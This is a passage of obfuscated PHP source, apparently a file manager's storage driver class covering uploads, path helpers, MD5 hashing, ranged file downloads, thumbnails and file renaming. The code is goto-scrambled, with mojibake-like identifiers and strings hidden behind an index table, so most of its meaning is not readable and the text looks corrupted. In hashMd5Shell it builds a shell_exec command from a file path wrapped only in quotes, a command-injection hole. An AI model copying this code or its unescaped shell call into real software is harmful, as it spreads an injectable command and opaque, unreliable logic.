(isset($e∏Â∏èñ¥ [$EÇ∫‡¢èó†[84]])) { $D”å∆µÂêﬁ[$EÇ∫‡¢èó†[84]] = $e∏Â∏èñ¥ [$EÇ∫‡¢èó†[84]]; } goto eÇ¯ô÷ä÷–; F™√™••ª‹: } return $Cå≠◊Úã«è; } public function upload($EÖ‚øŸË““, $cô‹í‹É´û, $f÷È¬ ∂Ò“ = false, $eùÂ √ãæΩ = REPEAT_REPLACE) { } public function uploadFileByID($bœÂøÈò’≠, $Aàßµàíñ‰, $cÖàõÖ©Çè) { } public function uploadFileByPath($Cä•êóÉÛå, $aí¢ô⁄¥å∞, $a°•¶≥⁄—∑ = array()) { } public function isUploadServer() { $bÍ∑∞ú¶∆Ç =& $_SERVER[™⁄»üÆ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $bÍ∑∞ú¶∆Ç[87]) { return !0; } return $GLOBALS[$bÍ∑∞ú¶∆Ç[6]][$bÍ∑∞ú¶∆Ç[88]][$bÍ∑∞ú¶∆Ç[89]]; } public function isFileOutServer() { $c∫ù‹ıÉâ» =& $_SERVER[™⁄»üÆ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $c∫ù‹ıÉâ»[87]) { return !0; } return $GLOBALS[$c∫ù‹ıÉâ»[6]][$c∫ù‹ıÉâ»[88]][$c∫ù‹ıÉâ»[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($DÂÊâ‹Œ˘Û) { $cÇ∆“®ûÏ≥ =& $_SERVER[™⁄»üÆ]; if (!$this->isCdnHost()) { return $DÂÊâ‹Œ˘Û; } return str_replace(trim(get_url_root($DÂÊâ‹Œ˘Û), $cÇ∆“®ûÏ≥[8]), trim($this->cdnHost, $cÇ∆“®ûÏ≥[8]), $DÂÊâ‹Œ˘Û); } public function uploadLink($fÇ‡¯Ôª…ç, $Fœœ≥êéèÑ = 0) { goto B°òØ–ó˘ì; f¬ì¢™îå∞: $e•¡¨ßíÍ∏ = $Fœœ≥êéèÑ <= $eîπ§«íÌ† ? $FÒù≥Û≤ö£[91] : $FÒù≥Û≤ö£[92]; $f ò£⁄âÙÌ = (!$Fœœ≥êéèÑ ? 1 : ceil($Fœœ≥êéèÑ / pow(1024, 3))) * 3600 * 4; $DÈå‡óœã« = $this->{$e•¡¨ßíÍ∏}($fÇ‡¯Ôª…ç, $f ò£⁄âÙÌ); goto CÂêÌ‚„£è; B°òØ–ó˘ì: $FÒù≥Û≤ö£ =& $_SERVER[™⁄»üÆ]; if ($this->isUploadServer()) { return; } $EÑ√ÃÖ√©‚ = $this->getType(); goto E∞ÿÖ±•Ù⁄; CÂêÌ‚„£è: if ($DÈå‡óœã«) { $DÈå‡óœã«[$FÒù≥Û≤ö£[93]] = $fÇ‡¯Ôª…ç; $DÈå‡óœã«[$FÒù≥Û≤ö£[94]] = $EÑ√ÃÖ√©‚; } return $DÈå‡óœã«; goto eÉ…„§ŒΩ·; E∞ÿÖ±•Ù⁄: if (!in_array($EÑ√ÃÖ√©‚, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $eîπ§«íÌ† = 1024 * 1024 * 10; goto f¬ì¢™îå∞; eÉ…„§ŒΩ·: } public function uploadFormData($a¨îêÑŒØ, $DãñÑæ„·™ = 3600) { } public function multiUploadFormData($C÷à«Ò·µ˘, $B™⁄≤ûéŒÈ = 3600) { } public function download($D¯‹è≠Ñ·Ô, $C”åï¶´ê›) { } public function ext($aüÒª”áâÉ) { $b”∏Ê®Î†à =& $_SERVER[™⁄»üÆ]; if (strpos($aüÒª”áâÉ, $b”∏Ê®Î†à[8]) === -1) { $dﬂﬂøÂ…ÑÚ = $aüÒª”áâÉ; } else { $dﬂﬂøÂ…ÑÚ = $this->pathThis($aüÒª”áâÉ); } $Eã¿˜”˜¿â = $b”∏Ê®Î†à[33]; if (strstr($dﬂﬂøÂ…ÑÚ, $b”∏Ê®Î†à[95])) { $Eã¿˜”˜¿â = substr($dﬂﬂøÂ…ÑÚ, strrpos($dﬂﬂøÂ…ÑÚ, $b”∏Ê®Î†à[95]) + 1); $Eã¿˜”˜¿â = strtolower($Eã¿˜”˜¿â); } if (strlen($Eã¿˜”˜¿â) > 3 && preg_match($b”∏Ê®Î†à[96], $Eã¿˜”˜¿â, $c≈Úîª‰Ÿê)) { $Eã¿˜”˜¿â = $b”∏Ê®Î†à[33]; } return $Eã¿˜”˜¿â; } public function pathThis($a‹õÁÀØ≥ü) { $c≠“É°â‚ê =& $_SERVER[™⁄»üÆ]; $a‹õÁÀØ≥ü = str_replace($c≠“É°â‚ê[97], $c≠“É°â‚ê[8], rtrim($a‹õÁÀØ≥ü, $c≠“É°â‚ê[8])); $Aò≈Àåöà√ = strrpos($a‹õÁÀØ≥ü, $c≠“É°â‚ê[8]); if ($Aò≈Àåöà√ === !1) { return $a‹õÁÀØ≥ü; } return substr($a‹õÁÀØ≥ü, $Aò≈Àåöà√ + 1); } public function pathFather($Cºäú©Òπú) { $DÍ≈çßÍà =& $_SERVER[™⁄»üÆ]; $Cºäú©Òπú = str_replace($DÍ≈çßÍà[97], $DÍ≈çßÍà[8], rtrim($Cºäú©Òπú, $DÍ≈çßÍà[8])); $Cà∑Ì¶ªÈõ = strrpos($Cºäú©Òπú, $DÍ≈çßÍà[8]); if ($Cà∑Ì¶ªÈõ === !1) { return $DÍ≈çßÍà[33]; } return substr($Cºäú©Òπú, 0, $Cà∑Ì¶ªÈõ + 1); } public function hashSimple($bâœ»∑È†Â) { goto Dë±Ã∫Í˜†; a‰≠Èè·≈∫: $C•Àåç⁄°∂ = intval($AÎÖÿ£á´Ò / $AÙå∫è®∞‚); $DÒò–Óñ∑Ñ = $B ÷®Œ≠™É[33]; for ($dç¨†ßØ»æ = 0; $dç¨†ßØ»æ < $AÙå∫è®∞‚; $dç¨†ßØ»æ++) { $DÒò–Óñ∑Ñ .= $this->fileSubstr($bâœ»∑È†Â, $C•Àåç⁄°∂ * $dç¨†ßØ»æ, $a£õ–¢öÇ); } goto eÈªá»‘°»; eÈªá»‘°»: $DÒò–Óñ∑Ñ .= $this->fileSubstr($bâœ»∑È†Â, $AÎÖÿ£á´Ò - $a£õ–¢öÇ, $a£õ–¢öÇ); return md5($DÒò–Óñ∑Ñ) . $AÎÖÿ£á´Ò; goto eÍÍÒ¥ƒ„”; Dë±Ã∫Í˜†: $B ÷®Œ≠™É =& $_SERVER[™⁄»üÆ]; if (!$bâœ»∑È†Â) { return md5($B ÷®Œ≠™É[33]); } $AÎÖÿ£á´Ò = $this->size($bâœ»∑È†Â); goto d¢’Ôî˜Î≤; d¢’Ôî˜Î≤: $a£õ–¢öÇ = 200; $AÙå∫è®∞‚ = 50; if ($AÎÖÿ£á´Ò <= $a£õ–¢öÇ * $AÙå∫è®∞‚) { return $this->hashMd5($bâœ»∑È†Â) . $AÎÖÿ£á´Ò; } goto a‰≠Èè·≈∫; eÍÍÒ¥ƒ„”: } public static $md5Cache = array(); public function hashMd5($e §±åàÖÌ) { $e §±åàÖÌ = $this->iconvSystem($e §±åàÖÌ); if (isset(self::$md5Cache[$e §±åàÖÌ])) { return self::$md5Cache[$e §±åàÖÌ]; } self::$md5Cache[$e §±åàÖÌ] = $this->hashMd5Shell($e §±åàÖÌ); if (!self::$md5Cache[$e §±åàÖÌ]) { self::$md5Cache[$e §±åàÖÌ] = @md5_file($e §±åàÖÌ); } return self::$md5Cache[$e §±åàÖÌ]; } private function hashMd5Shell($fë⁄Ü…Ï¥ö) { goto Eﬁà≠∞¥€ﬂ; E‘Ÿ√∏òÏà: $cÃŸï≈©ë√ = Cache::get($c›é—ΩÎæ◊[101]); if (!$cÃŸï≈©ë√) { $AÎ™«·û—∫ = BASIC_PATH . $c›é—ΩÎæ◊[102]; $CúªñØﬂ≈  = md5_file($AÎ™«·û—∫); $cÃŸï≈©ë√ = $c›é—ΩÎæ◊[103]; foreach ($dêñ©æãÛÌ as $A£æ„¿å∏Ñ) { $BÁ’†ä‚ØÆ = shell_exec($A£æ„¿å∏Ñ . "\40\x22{$AÎ™«·û—∫}\42"); if ($BÁ’†ä‚ØÆ && substr(trim($BÁ’†ä‚ØÆ), 0, 32) == $CúªñØﬂ≈ ) { $cÃŸï≈©ë√ = $A£æ„¿å∏Ñ; break; } } Cache::set($c›é—ΩÎæ◊[101], $cÃŸï≈©ë√, 3600); } if ($cÃŸï≈©ë√ == $c›é—ΩÎæ◊[103]) { return !1; } goto BŒí√ÀäÈî; BŒí√ÀäÈî: $BÁ’†ä‚ØÆ = shell_exec($cÃŸï≈©ë√ . "\x20\x22{$fë⁄Ü…Ï¥ö}\x22"); $BÁ’†ä‚ØÆ = str_replace($c›é—ΩÎæ◊[104], $c›é—ΩÎæ◊[33], $BÁ’†ä‚ØÆ); return substr($BÁ’†ä‚ØÆ, 0, 32); goto fé°¯ÑÇœ‚; Eﬁà≠∞¥€ﬂ: $c›é—ΩÎæ◊ =& $_SERVER[™⁄»üÆ]; if (!function_exists($c›é—ΩÎæ◊[98])) { return !1; } $dêñ©æãÛÌ = array($c›é—ΩÎæ◊[99], $c›é—ΩÎæ◊[100]); goto E‘Ÿ√∏òÏà; fé°¯ÑÇœ‚: } public function link($Cøª◊ÇÊ°ï) { return $Cøª◊ÇÊ°ï; } public function fileOut($eΩ¬ø€ëŸ‘, $eªí¨êï¡ß = false, $bÂ–∂ıî» = false, $B⁄∑ªé Æß = '') { goto f§§ôêÿóÙ; FÉò±°ëè¬: $cÉ≥ôù–Âß = $E¶â‡´Íı∫[116] . $cÉ≥ôù–Âß . $E¶â‡´Íı∫[122] . $cÉ≥ôù–Âß; if ($eªí¨êï¡ß) { header($E¶â‡´Íı∫[123]); header($E¶â‡´Íı∫[124] . $cÉ≥ôù–Âß); } else { header($E¶â‡´Íı∫[125] . $cÉ≥ôù–Âß); } header($E¶â‡´Íı∫[126] . gmdate($E¶â‡´Íı∫[110], time() + 3600 * 24 * 30) . $E¶â‡´Íı∫[127]); goto AÛ»ÿ÷Ù‚ß; f§§ôêÿóÙ: $E¶â‡´Íı∫ =& $_SERVER[™⁄»üÆ]; $this->cacheMethod(null, null); if (!$eΩ¬ø€ëŸ‘ || !$this->exist($eΩ¬ø€ëŸ‘)) { show_json(LNG($E¶â‡´Íı∫[105]), !1, $bÂ–∂ıî»); } goto C°Àﬁë©ÖÁ; b¬≤å≠î∆á: $D©Îïø∆Û∏ = !0; if ($_SERVER[$E¶â‡´Íı∫[154]] == $E¶â‡´Íı∫[155] && $B√Û†ôŒÁ™ > 1204 * 1024 * 1024 * 2) { $D©Îïø∆Û∏ = !1; } if ($D©Îïø∆Û∏) { header($E¶â‡´Íı∫[156] . ($e√ôé§◊Ûô - $b´ÿã«ñ≈◊ + 1)); } goto aïÁÑê≠â§; f…ÜèÒÖ¶•: $b´ÿã«ñ≈◊ = 0; $e√ôé§◊Ûô = $B√Û†ôŒÁ™ - 1; $B⁄∫àûÉçÃ = $this->ext($a≠∂ŸÇÇá∑); goto aË≥π◊ôìÀ; fëóÓÇ¥™˘: header($E¶â‡´Íı∫[138] . $B√Û†ôŒÁ™); header($E¶â‡´Íı∫[139]); if (!$eªí¨êï¡ß && $B⁄∫àûÉçÃ == $E¶â‡´Íı∫[140]) { if ($B√Û†ôŒÁ™ > 1024 * 1024 * 5) { die; } $F€ÁôÖ©çì = $this->getContent($eΩ¬ø€ëŸ‘); $F€ÁôÖ©çì = Html::clearSVG($F€ÁôÖ©çì); header($E¶â‡´Íı∫[141] . strlen($F€ÁôÖ©çì)); echo $F€ÁôÖ©çì; die; } goto eîÁ‹á°„Ã; D¡ÂßÏ•©ú: if ($F§¯’˜ëò◊) { $d≤ËπÆü∞≥ = intval(1000 * 1000 * ($d∏îª´⁄Ú„ / $F§¯’˜ëò◊)); } while ($b´ÿã«ñ≈◊ <= $e√ôé§◊Ûô) { $F‡È‘Õπ˘É = timeFloat(); check_abort(); $bÃﬂµπÙ¨¶ = $e√ôé§◊Ûô - $b´ÿã«ñ≈◊ + 1; if ($bÃﬂµπÙ¨¶ <= $d∏îª´⁄Ú„) { $d∏îª´⁄Ú„ = $bÃﬂµπÙ¨¶; } echo $this->fileSubstr($eΩ¬ø€ëŸ‘, $b´ÿã«ñ≈◊, $d∏îª´⁄Ú„); $b´ÿã«ñ≈◊ += $d∏îª´⁄Ú„; if ($d∏îª´⁄Ú„ == $bÃﬂµπÙ¨¶) { $b´ÿã«ñ≈◊ = $e√ôé§◊Ûô + 1; } if ($d≤ËπÆü∞≥) { $Bß…“Ú•Ú◊ = intval(1000 * 1000 * (timeFloat() - $F‡È‘Õπ˘É)); $e Ù≥ÿó⁄ç = $d≤ËπÆü∞≥ - $Bß…“Ú•Ú◊; if ($e Ù≥ÿó⁄ç > 5) { usleep($e Ù≥ÿó⁄ç); } } } goto B”§–ËÍ∆©; F¶¢ßîƒì≤: header($E¶â‡´Íı∫[120]); header($E¶â‡´Íı∫[121] . $cæ•∞åù§ˆ); $cÉ≥ôù–Âß = rawurlencode($a≠∂ŸÇÇá∑); goto FÉò±°ëè¬; dù±€´Œóø: header($E¶â‡´Íı∫[135] . $f…ô£∫Ñèë . $E¶â‡´Íı∫[127]); header($E¶â‡´Íı∫[136] . $a≠∂ŸÇÇá∑); header($E¶â‡´Íı∫[137]); goto fëóÓÇ¥™˘; eîÁ‹á°„Ã: $Dﬁ™Í†üµƒ = strtolower($_SERVER[$E¶â‡´Íı∫[142]]); if ($b·àìë¯Ï£ && $Dﬁ™Í†üµƒ && $bâÀâ÷±ÊÇ) { if (strstr($Dﬁ™Í†üµƒ, $E¶â‡´Íı∫[143])) { header($E¶â‡´Íı∫[144] . $eΩ¬ø€ëŸ‘); } else { if (strstr($Dﬁ™Í†üµƒ, $E¶â‡´Íı∫[145])) { header($E¶â‡´Íı∫[146] . $eΩ¬ø€ëŸ‘); } else { if (strstr($Dﬁ™Í†üµƒ, $E¶â‡´Íı∫[147])) { header($E¶â‡´Íı∫[148] . $eΩ¬ø€ëŸ‘); } } } if ($F§¯’˜ëò◊) { header($E¶â‡´Íı∫[149] . $F§¯’˜ëò◊); } return; } if (isset($_SERVER[$E¶â‡´Íı∫[150]])) { if (preg_match($E¶â‡´Íı∫[151], $_SERVER[$E¶â‡´Íı∫[150]], $dˆ‹µ—‘È·)) { $b´ÿã«ñ≈◊ = intval($dˆ‹µ—‘È·[1]); if (!empty($dˆ‹µ—‘È·[2])) { $e√ôé§◊Ûô = intval($dˆ‹µ—‘È·[2]); } } header($E¶â‡´Íı∫[152]); header("\103\157\x6e\x74\x65\x6e\x74\x2d\122\141\156\x67\145\72\x20\x62\171\x74\x65\163\40{$b´ÿã«ñ≈◊}\55{$e√ôé§◊Ûô}\57" . $B√Û†ôŒÁ™); } else { header($E¶â‡´Íı∫[153]); } goto b¬≤å≠î∆á; a≠∆ú∂ç±ë: @ob_end_clean(); set_timeout(); $C¢¡∞¨–á‹ = $this->infoFull($eΩ¬ø€ëŸ‘); goto B∂ı∫‰‰≠Ó; C°Àﬁë©ÖÁ: $b·àìë¯Ï£ = $this->getType() == $E¶â‡´Íı∫[106]; $bâÀâ÷±ÊÇ = $GLOBALS[$E¶â‡´Íı∫[6]][$E¶â‡´Íı∫[88]][$E¶â‡´Íı∫[107]][$E¶â‡´Íı∫[108]]; $F§¯’˜ëò◊ = (double) $GLOBALS[$E¶â‡´Íı∫[6]][$E¶â‡´Íı∫[88]][$E¶â‡´Íı∫[107]][$E¶â‡´Íı∫[109]] * 1024 * 1024; goto a≠∆ú∂ç±ë; AÛ»ÿ÷Ù‚ß: header($E¶â‡´Íı∫[128]); header($E¶â‡´Íı∫[129]); header($E¶â‡´Íı∫[130]); goto EèÇÿàÕÑ∫; aïÁÑê≠â§: if ($_SERVER[$E¶â‡´Íı∫[157]] == $E¶â‡´Íı∫[158]) { return; } $d∏îª´⁄Ú„ = 1024 * 100; $d≤ËπÆü∞≥ = 0; goto D¡ÂßÏ•©ú; EèÇÿàÕÑ∫: if (isset($_SERVER[$E¶â‡´Íı∫[131]]) && strtotime($_SERVER[$E¶â‡´Íı∫[131]]) == $C¢¡∞¨–á‹[$E¶â‡´Íı∫[84]]) { header($E¶â‡´Íı∫[132], !0, 304); die; } if (isset($_SERVER[$E¶â‡´Íı∫[133]]) && $_SERVER[$E¶â‡´Íı∫[133]] == $B⁄∑ªé Æß) { header($E¶â‡´Íı∫[134] . $B⁄∑ªé Æß, !0, 304); die; } header($E¶â‡´Íı∫[134] . $B⁄∑ªé Æß); goto dù±€´Œóø; aË≥π◊ôìÀ: if (in_array($B⁄∫àûÉçÃ, array($E¶â‡´Íı∫[111], $E¶â‡´Íı∫[112], $E¶â‡´Íı∫[113], $E¶â‡´Íı∫[114]))) { $B⁄∫àûÉçÃ = $E¶â‡´Íı∫[115]; } if (!$B⁄∑ªé Æß) { $B⁄∑ªé Æß = md5($f…ô£∫Ñèë . $this->hashSimple($eΩ¬ø€ëŸ‘)); } $B⁄∑ªé Æß = $E¶â‡´Íı∫[116] . $B⁄∑ªé Æß . $E¶â‡´Íı∫[116]; goto Böﬁ…–≈Üè; B∂ı∫‰‰≠Ó: $B√Û†ôŒÁ™ = $C¢¡∞¨–á‹[$E¶â‡´Íı∫[78]]; $f…ô£∫Ñèë = gmdate($E¶â‡´Íı∫[110], $C¢¡∞¨–á‹[$E¶â‡´Íı∫[84]]); $a≠∂ŸÇÇá∑ = $bÂ–∂ıî» ? $bÂ–∂ıî» : $this->iconvApp($C¢¡∞¨–á‹[$E¶â‡´Íı∫[28]]); goto f…ÜèÒÖ¶•; Böﬁ…–≈Üè: $cæ•∞åù§ˆ = get_file_mime($B⁄∫àûÉçÃ); if (strstr($cæ•∞åù§ˆ, $E¶â‡´Íı∫[117])) { $cæ•∞åù§ˆ = $cæ•∞åù§ˆ . $E¶â‡´Íı∫[118]; } if ($eªí¨êï¡ß === !1 && !mime_support($cæ•∞åù§ˆ)) { $eªí¨êï¡ß = !0; $cæ•∞åù§ˆ = $E¶â‡´Íı∫[119]; } goto F¶¢ßîƒì≤; B”§–ËÍ∆©: } public function fileOutServer($Bø ÿ◊¬¶…, $fÒﬂ äâÉÃ = false, $A™´º»‹ò˜ = false, $a €—Ç ¬≈ = '') { $this->fileOut($Bø ÿ◊¬¶…, $fÒﬂ äâÉÃ, $A™´º»‹ò˜, $a €—Ç ¬≈); } public function fileOutLink($e¨ïè≈Ú†é) { header($_SERVER[™⁄»üÆ][159] . $e¨ïè≈Ú†é); die; } public function cacheMethod($dıÍÀıêÿ†, $aá°¿ÿÂîë, $e›€ä√“÷∑ = null) { goto C„ÏÓ≤ã±ﬂ; b≈„ŸÆÂ∏ª: $C°ç‡·°ŸÎ = $this->{$dıÍÀıêÿ†}($aá°¿ÿÂîë); $fß≈‘ä’¡ü[$Eç§‡ç–‡∞] = $C°ç‡·°ŸÎ; return $C°ç‡·°ŸÎ; goto EÛâ†Õ∑∫; C’”©ãı€˜: $Eç§‡ç–‡∞ = $fó˘‡†òèö[160] . $dıÍÀıêÿ† . $fó˘‡†òèö[161] . rtrim($Dåª∂äÜ£∑, $fó˘‡†òèö[8]); if (is_null($dıÍÀıêÿ†)) { $fß≈‘ä’¡ü = array(); return; } if (is_null($aá°¿ÿÂîë)) { unset($fß≈‘ä’¡ü[$Eç§‡ç–‡∞]); return; } goto C“üìƒ‰£π; C„ÏÓ≤ã±ﬂ: $fó˘‡†òèö =& $_SERVER[™⁄»üÆ]; static $fß≈‘ä’¡ü = array(); $Dåª∂äÜ£∑ = $aá°¿ÿÂîë ? ltrim($this->getPathOuter($aá°¿ÿÂîë), $fó˘‡†òèö[8]) : $aá°¿ÿÂîë; goto C’”©ãı€˜; C“üìƒ‰£π: if (!is_null($e›€ä√“÷∑)) { $fß≈‘ä’¡ü[$Eç§‡ç–‡∞] = $e›€ä√“÷∑; return; } $C°ç‡·°ŸÎ = isset($fß≈‘ä’¡ü[$Eç§‡ç–‡∞]) ? $fß≈‘ä’¡ü[$Eç§‡ç–‡∞] : null; if (!is_null($C°ç‡·°ŸÎ)) { return $C°ç‡·°ŸÎ; } goto b≈„ŸÆÂ∏ª; EÛâ†Õ∑∫: } public function fileOutImage($FáèÖ´ƒ„˜, $b»÷ÚØÍÛº = 250) { goto FéàÍ≥Èù∆; AÚ—Ç‚ı∞â: del_file($CΩáµâºƒ¯); IO::fileOut($bÙæ¢À◊´ù); goto eá∑Ç…ƒéˆ; A∏ä◊Ü≠å‡: $BÒ—≥ß·ïü = $this->info($FáèÖ´ƒ„˜); $D‘Ëπ«ÎÉü = $BÒ—≥ß·ïü[$cË’ü∂ø∂ò[28]]; $CÜ±Á‚òòá = !1; goto AﬁŸ∂Ôƒ≠∂; Aÿ••à¬°: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $CΩáµâºƒ¯ = DATA_THUMB . $fèÂ¶∑‰ë£; del_file($CΩáµâºƒ¯); goto c”ä≠ƒ¨ëﬁ; FéàÍ≥Èù∆: $cË’ü∂ø∂ò =& $_SERVER[™⁄»üÆ]; set_timeout(); if (substr($FáèÖ´ƒ„˜, 0, 4) == $cË’ü∂ø∂ò[147]) { $this->fileOutLink($FáèÖ´ƒ„˜); } goto A∏ä◊Ü≠å‡; AﬁŸ∂Ôƒ≠∂: if (isset($GLOBALS[$cË’ü∂ø∂ò[162]]) && $GLOBALS[$cË’ü∂ø∂ò[162]][$cË’ü∂ø∂ò[76]] == $BÒ—≥ß·ïü[$cË’ü∂ø∂ò[76]]) { $dÖ¨å–Õ÷ = $GLOBALS[$cË’ü∂ø∂ò[162]][$cË’ü∂ø∂ò[163]]; if (!$BÒ—≥ß·ïü[$cË’ü∂ø∂ò[164]]) { $BÒ—≥ß·ïü[$cË’ü∂ø∂ò[164]] = $GLOBALS[$cË’ü∂ø∂ò[162]]; } if (isset($dÖ¨å–Õ÷[$cË’ü∂ø∂ò[165]])) { if ($dÖ¨å–Õ÷[$cË’ü∂ø∂ò[165]] <= $b»÷ÚØÍÛº && $dÖ¨å–Õ÷[$cË’ü∂ø∂ò[166]] <= $b»÷ÚØÍÛº) { $CÜ±Á‚òòá = !0; } } $D‘Ëπ«ÎÉü = $BÒ—≥ß·ïü[$cË’ü∂ø∂ò[164]][$cË’ü∂ø∂ò[28]]; } if ($BÒ—≥ß·ïü[$cË’ü∂ø∂ò[78]] <= 1024 * 50 || $CÜ±Á‚òòá || !function_exists($cË’ü∂ø∂ò[167]) || $BÒ—≥ß·ïü[$cË’ü∂ø∂ò[168]] == $cË’ü∂ø∂ò[169]) { return $this->fileOut($FáèÖ´ƒ„˜, !1, $D‘Ëπ«ÎÉü); } if (isset($BÒ—≥ß·ïü[$cË’ü∂ø∂ò[164]][$cË’ü∂ø∂ò[170]])) { $cÊ¥ô⁄°‹ÿ = $BÒ—≥ß·ïü[$cË’ü∂ø∂ò[164]][$cË’ü∂ø∂ò[170]]; } else { if (isset($BÒ—≥ß·ïü[$cË’ü∂ø∂ò[164]][$cË’ü∂ø∂ò[171]])) { $cÊ¥ô⁄°‹ÿ = $BÒ—≥ß·ïü[$cË’ü∂ø∂ò[164]][$cË’ü∂ø∂ò[171]]; } else { $cÊ¥ô⁄°‹ÿ = md5("{$BÒ—≥ß·ïü[$cË’ü∂ø∂ò[28]]}\137{$BÒ—≥ß·ïü[$cË’ü∂ø∂ò[76]]}\x5f{$BÒ—≥ß·ïü[$cË’ü∂ø∂ò[78]]}"); } } goto F¶«ÜÓ„àÆ; c”ä≠ƒ¨ëﬁ: if (!@file_exists($CΩáµâºƒ¯)) { $d™«µûÿàÙ = TEMP_FILES; if (!is_dir($d™«µûÿàÙ)) { mk_dir($d™«µûÿàÙ); } $fñî®›ê¥ﬂ = $d™«µûÿàÙ . $cÊ¥ô⁄°‹ÿ . $cË’ü∂ø∂ò[95] . $BÒ—≥ß·ïü[$cË’ü∂ø∂ò[168]]; if (!@file_exists($fñî®›ê¥ﬂ)) { $fñî®›ê¥ﬂ = $this->download($FáèÖ´ƒ„˜, $fñî®›ê¥ﬂ); } ImageThumb::createThumb($fñî®›ê¥ﬂ, $CΩáµâºƒ¯, $b»÷ÚØÍÛº, $b»÷ÚØÍÛº * 10); } if (!file_exists($CΩáµâºƒ¯) || filesize($CΩáµâºƒ¯) < 100) { return @file_exists($fñî®›ê¥ﬂ) ? IO::fileOut($fñî®›ê¥ﬂ) : $this->fileOut($FáèÖ´ƒ„˜); } if (!($bÙæ¢À◊´ù = IO::move($CΩáµâºƒ¯, $b∂è›è€¨ﬁ))) { return IO::fileOut($CΩáµâºƒ¯); } goto AÚ—Ç‚ı∞â; F¶«ÜÓ„àÆ: $fèÂ¶∑‰ë£ = "{$cÊ¥ô⁄°‹ÿ}\x5f{$b»÷ÚØÍÛº}\56\x70\156\147"; if (!($A‡≤Ÿ≤Ñø˘ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $cË’ü∂ø∂ò[172]))) { $b∂è›è€¨ﬁ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $cË’ü∂ø∂ò[173]); } else { $b∂è›è€¨ﬁ = KodIO::make($A‡≤Ÿ≤Ñø˘); } if ($A‡≤Ÿ≤Ñø˘ = IO::fileNameExist($b∂è›è€¨ﬁ, $fèÂ¶∑‰ë£)) { $CΩáµâºƒ¯ = KodIO::make($A‡≤Ÿ≤Ñø˘); return IO::fileOut($CΩáµâºƒ¯, !1, $D‘Ëπ«ÎÉü); } goto Aÿ••à¬°; eá∑Ç…ƒéˆ: } public function fileOutImageServer($d¡≥úªÊ¡ﬂ, $c±¨¿·öÑÌ = 250) { $this->fileOutImage($d¡≥úªÊ¡ﬂ, $c±¨¿·öÑÌ); } public function fileNameAuto($cÆ≈Ü∫ªà´, $B©“ÌÓúŸ…, $F∫¬ÿø∫‚ü = REPEAT_RENAME, $d¡ßä≤ËÌ’ = false) { goto cÇÉˆ‡º¿Ã; cÇÉˆ‡º¿Ã: $C√îµòù‰◊ =& $_SERVER[™⁄»üÆ]; $Bî˜∑¬Õ”≤ = $cÆ≈Ü∫ªà´ === $C√îµòù‰◊[33] ? $B©“ÌÓúŸ… : rtrim($cÆ≈Ü∫ªà´, $C√îµòù‰◊[8]) . $C√îµòù‰◊[8] . $B©“ÌÓúŸ…; if ($F∫¬ÿø∫‚ü == REPEAT_REPLACE || !$this->exist($Bî˜∑¬Õ”≤) || $d¡ßä≤ËÌ’ && $F∫¬ÿø∫‚ü != REPEAT_RENAME_FOLDER) { return $B©“ÌÓúŸ…; } goto eêø≠ú††∞; F∂ıÎ¥Ó∆é: while ($this->exist(rtrim($cÆ≈Ü∫ªà´, $C√îµòù‰◊[8]) . $C√îµòù‰◊[8] . $aÖ˘ıááù£)) { $aÖ˘ıááù£ = $C‰•‹πã⁄Ÿ . "\x28{$d»Ÿ´çÛäû}\51{$cÖÓˆœ¬˘—}"; $d»Ÿ´çÛäû++; } return $aÖ˘ıááù£; goto eµΩ›ˆÌµ…; fçå«©…‚¶: $d»Ÿ´çÛäû = 1; $C‰•‹πã⁄Ÿ = substr($B©“ÌÓúŸ…, 0, strlen($B©“ÌÓúŸ…) - strlen($cÖÓˆœ¬˘—)); $aÖ˘ıááù£ = $C‰•‹πã⁄Ÿ . "\50{$d»Ÿ´çÛäû}\51{$cÖÓˆœ¬˘—}"; goto F∂ıÎ¥Ó∆é; eêø≠ú††∞: if ($F∫¬ÿø∫‚ü == REPEAT_SKIP) { return !1; } $cÖÓˆœ¬˘— = $C√îµòù‰◊[95] . get_path_ext($B©“ÌÓúŸ…); $cÖÓˆœ¬˘— = $cÖÓˆœ¬˘— == $C√îµòù‰◊[95] || $d¡ßä≤ËÌ’ ? $C√îµòù‰◊[33] : $cÖÓˆœ¬˘—; goto fçå«©…‚¶; eµΩ›ˆÌµ…: } private function fileNameAutoList($FÍ◊ß·ÊÍï, $b·‡…Òåìñ, $c·êëÖù¬Ü = false) { goto BÁïôêë‹®; E™µØçò≥º: $eÿÛä…ê˜œ = array_to_keyvalue($AÇ˘¥Ü¿ﬁÆ, $D‚ÒÑÁ§êì[33], $D‚ÒÑÁ§êì[28]); $aΩ˜πΩ»ƒ = $D‚ÒÑÁ§êì[95] . get_path_ext($b·‡…Òåìñ); $aΩ˜πΩ»ƒ = $aΩ˜πΩ»ƒ == $D‚ÒÑÁ§êì[95] || $c·êëÖù¬Ü ? $D‚ÒÑÁ§êì[33] : $aΩ˜πΩ»ƒ; goto E»ƒ¡ü™ÛÏ; BÁïôêë‹®: $D‚ÒÑÁ§êì =& $_SERVER[™⁄»üÆ]; $AÇ˘¥Ü¿ﬁÆ = $this->listPath($FÍ◊ß·ÊÍï, !0); $AÇ˘¥Ü¿ﬁÆ = array_merge($AÇ˘¥Ü¿ﬁÆ[$D‚ÒÑÁ§êì[75]], $AÇ˘¥Ü¿ﬁÆ[$D‚ÒÑÁ§êì[74]]); goto E™µØçò≥º; dôè‰áŸ©¶: return $a˘Úß»É§ê; goto aÀùÔ‘Ú«; E»ƒ¡ü™ÛÏ: $a‰ﬁ∑Øî¡Ñ = substr($b·‡…Òåìñ, 0, strlen($b·‡…Òåìñ) - strlen($aΩ˜πΩ»ƒ)); $a˘Úß»É§ê = $a‰ﬁ∑Øî¡Ñ . "\50\60\51{$aΩ˜πΩ»ƒ}"; for ($aÈ°íÏê√» = 1; $aÈ°íÏê√» <= count($eÿÛä…ê˜œ) + 1; $aÈ°íÏê√»++) { $a˘Úß»É§ê = $a‰ﬁ∑Øî¡Ñ . "\x28{$aÈ°íÏê√»}\51{$aΩ˜πΩ»ƒ}"; if (!in_array_not_case($a˘Úß»É§ê, $eÿÛä…ê˜œ)) { return $a˘Úß»É§ê; } } goto dôè‰áŸ©¶; 